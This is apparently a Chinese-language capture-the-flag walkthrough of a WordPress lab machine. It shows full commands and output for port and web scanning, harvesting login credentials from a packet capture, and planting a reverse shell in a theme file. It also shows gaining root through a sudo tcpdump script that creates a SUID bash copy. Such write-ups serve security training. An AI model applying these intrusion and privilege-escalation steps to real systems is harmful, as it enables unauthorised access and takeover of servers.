# 信息搜集

1、端口扫描

```bash
└─# nmap -sVC -A -O -p- 192.168.0.102 -oA nmap.txt
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2ac734c17ec6a8279875af922d412cb (RSA)
|   256 9cd5f32ce2d006cc8c155a5a815b033d (ECDSA)
|_  256 ab67566927ea3e3b337332f8ff2e1f20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 4.9.8
|_http-title: Example site &#8211; Just another WordPress site
MAC Address: 00:0C:29:A2:23:19 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2、80端口简单探测， worldpress 站点

```bash
└─# nikto -host 192.168.0.102  
```

```bash
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal Link header found with value: </index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wp-login.php: Wordpress login found.
+ 8102 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2023-06-30 00:15:58 (GMT-4) (30 seconds)
---------------------------------------------------------------------------
```

3、web目录扫描

```http
└─# dirb http://192.168.0.102/
```

此时发现关键目录

http://192.168.0.102/ipdata/

<img src=".\图片\Snipaste_2023-06-30_12-54-06.png" alt="Snipaste_2023-06-30_12-54-06" style="zoom:80%;" />

4、wpscan扫描，枚举用户

```bash
wpscan --url https://192.168.0.102/ --enumerate u1-100
```

发现用户 webdeveloper

# web打点

## analyze.cap流量分析

查看目录扫描中发现的关键文件

```bash
└─# file analyze.cap 
analyze.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

使用 wireshark 打开分析，此时可以找好 cookie 看看失效没有，但这里找到了登录wp后台的账号密码

<img src=".\图片\Snipaste_2023-06-30_13-01-58.png" alt="Snipaste_2023-06-30_13-01-58" style="zoom:80%;" />

```
webdeveloper:Te5eQg&4sBS!Yr$)wf%(DcAd
```

## wp后台getshell

<img src=".\图片\Snipaste_2023-06-30_13-04-58.png" alt="Snipaste_2023-06-30_13-04-58" style="zoom:80%;" />

老生常谈，修改相关的主题或者插件文件为php反弹shell，再访问触发即可

修改 404 文件

<img src=".\图片\Snipaste_2023-06-30_13-09-08.png" alt="Snipaste_2023-06-30_13-09-08" style="zoom:80%;" />

使用对应模版

<img src=".\图片\Snipaste_2023-06-30_13-09-38.png" alt="Snipaste_2023-06-30_13-09-38" style="zoom:80%;" />

找到路径，触发，即可得到反弹shell

```http
http://192.168.0.102/wp-content/themes/twentysixteen/404.php
```

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@webdeveloper:/$ whoami
whoami
www-data
```

# 提权

## 提权webdeveloper

1、查看用户信息

```bash
www-data@webdeveloper:/$ cat /etc/passwd | grep home | grep -v nologin
cat /etc/passwd | grep home
webdeveloper:x:1000:1000:WebDeveloper:/home/webdeveloper:/bin/bash
```

2、翻阅wp网站里的配置信息

```bash
www-data@webdeveloper:/var/www/html$ cat wp-config.php
```

发现数据库连接的账号密码

```bash
/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

```
webdeveloper:MasterOfTheUniverse
```

3、查看当前网络连接情况，发现是 mysql 数据库

```bash
www-data@webdeveloper:/var/www/html$ netstat -anpt
netstat -anpt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0    284 192.168.0.102:53934     192.168.0.103:1234      ESTABLISHED 25208/sh            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 192.168.0.102:80        192.168.0.101:30887     ESTABLISHED -            
```

4、尝试 ssh 登录

```bash
webdeveloper@webdeveloper:~$ whoami
webdeveloper
webdeveloper@webdeveloper:~$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

## 提权到root

1、查看 sudo 权限

```bash
webdeveloper@webdeveloper:~$ sudo -l

[sudo] password for webdeveloper: 
Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

2、`/usr/sbin/tcpdump` 提权

上网站 [GTFOBins](https://gtfobins.github.io/) 查询

<img src=".\图片\Snipaste_2023-06-30_13-29-15.png" alt="Snipaste_2023-06-30_13-29-15" style="zoom:80%;" />

### 步骤

1、创建脚本 /tmp/2root

```bash
webdeveloper@webdeveloper:/tmp$ vim 2root
webdeveloper@webdeveloper:/tmp$ chmod +x 2root 
webdeveloper@webdeveloper:/tmp$ cat 2root 
#!/bin/bash
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
```

2、执行

lo 可换成本地网卡 eth0

```bash
webdeveloper@webdeveloper:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.102  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::20c:29ff:fea2:2319  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:a2:23:19  txqueuelen 1000  (Ethernet)
        RX packets 804367  bytes 546618314 (546.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 620712  bytes 253431226 (253.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 582  bytes 50911 (50.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 582  bytes 50911 (50.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/2root
```

```bash
webdeveloper@webdeveloper:/tmp$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/2root
```

3、使用复制的 /bin/bash 提权

```bash
webdeveloper@webdeveloper:/tmp$ ls
2root
shell
systemd-private-b03708e2a46d4027852cd35df1cbbe10-apache2.service-9cotMi
systemd-private-b03708e2a46d4027852cd35df1cbbe10-systemd-resolved.service-XlU4MV
systemd-private-b03708e2a46d4027852cd35df1cbbe10-systemd-timesyncd.service-UrgtH3
tmp.ONSjhxQb5T
vmware-root_2082-826912710
vmware-root_2171-1857291366
```

```bash
webdeveloper@webdeveloper:/tmp$ ./shell -p
shell-4.4# id
uid=1000(webdeveloper) gid=1000(webdeveloper) euid=0(root) groups=1000(webdeveloper),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

```bash
shell-4.4# cd /root
shell-4.4# ls
flag.txt
shell-4.4# cat fla*
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
```

# 总结

kali 中 flie 命令可以查看文件类型

worldpress 后台提权可以是修改相关主题或插件为反弹shell，再访问触发即可

tcpdump 具有 sudo 权限时可以提权

有一定权限后，可以查看网站的配置信息，从而获得更多的信息


